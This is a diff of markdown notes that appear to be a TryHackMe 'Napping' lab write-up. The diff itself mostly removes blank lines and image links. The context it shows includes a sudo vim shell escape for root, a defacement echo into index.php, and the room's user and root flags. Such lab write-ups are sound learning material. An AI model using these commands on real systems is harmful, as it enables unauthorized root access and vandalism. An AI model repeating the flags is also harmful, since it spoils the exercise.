@@ -207,7 +207,6 @@ view-source:http://10.10.196.198/admin/login.php
         <h2>Admin Login</h2>
         <p>Please fill in your credentials to login.</p>
 
-
         <form action="/admin/login.php" method="post">
             <div class="form-group">
                 <label>Username</label>
@@ -257,7 +256,6 @@ We don't have the admin credentials but since we know the admin built the site, 
     <div class="wrapper">
         <h2>Admin Login</h2>
         <p>Please fill in your credentials to login.</p>
-
 
         <form action="/admin/login.php" method="post">
             <div class="form-group">
@@ -421,10 +419,8 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
   Memory usage: 60%               IPv4 address for eth0: 10.10.196.198
   Swap usage:   0%
 
-
 10 updates can be applied immediately.
 To see these additional updates run: apt list --upgradable
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
@@ -489,7 +485,6 @@ else:
     f.write(dt_string)
     f.write("\n")
     f.close()
-
 
 daniel@napping:/home/adrian$ ls
 query.py  site_status.txt  user.txt
@@ -570,7 +565,6 @@ adrian@napping:~$ cat user.txt
 cat user.txt
 THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}
 
-
 vertical escalation:
 
 adrian@napping:~$ sudo -l
@@ -584,9 +578,7 @@ User adrian may run the following commands on napping:
 
 https://gtfobins.github.io/gtfobins/vim/
 
-
 sudo vim -c ':!/bin/sh'
-
 
 adrian@napping:~$ sudo vim -c ':!/bin/sh'
 sudo vim -c ':!/bin/sh'
@@ -1362,7 +1354,6 @@ if($_SESSION["id"] !== 1 ){
 }
 ?>
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1420,19 +1411,7 @@ echo "</table>";
         </html>
 # echo "<h1>Pwnd by Witty</h1>" >> index.php
 
-
-
 ```
-
-![[Pasted image 20230110120333.png]]
-
-![[Pasted image 20230110135338.png]]
-
-
-![[Pasted image 20230110135315.png]]
-
-![[Pasted image 20230110151727.png]]
-
 
 What is the user flag?  
 
@@ -1441,6 +1420,5 @@ What is the user flag?
 What is the root flag?
 
 	*THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}*
-
 
 [[Kubernetes for Everyone]]
